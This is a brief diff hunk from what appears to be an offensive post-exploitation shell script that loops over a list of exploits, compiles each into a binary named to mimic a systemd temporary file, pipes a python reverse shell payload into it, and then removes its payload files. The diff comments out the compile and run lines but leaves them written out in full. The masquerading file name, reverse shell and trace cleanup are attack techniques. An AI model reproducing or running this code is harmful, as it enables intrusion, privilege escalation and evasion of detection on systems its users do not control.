@@ -94,9 +94,9 @@ EOF
   done
   '
   for i in ${exploits_major_array[*]}; do
-    gcc -pthread -o /tmp/.systemd-private-a2e8e80eec1f4f41b7b21b930abcf273-system.service-2S5dfx /tmp/$ip:$portp/exploits/$i &>/dev/null
+    #gcc -pthread -o /tmp/.systemd-private-a2e8e80eec1f4f41b7b21b930abcf273-system.service-2S5dfx /tmp/$ip:$portp/exploits/$i &>/dev/null
     echo "attempting $i..."
-    echo $python_reverse | /tmp/.systemd-private-a2e8e80eec1f4f41b7b21b930abcf273-system.service-2S5dfx &>/dev/null
+    #echo $python_reverse | /tmp/.systemd-private-a2e8e80eec1f4f41b7b21b930abcf273-system.service-2S5dfx &>/dev/null
     sleep 3
   done
   printf "removing files needed by payload... "
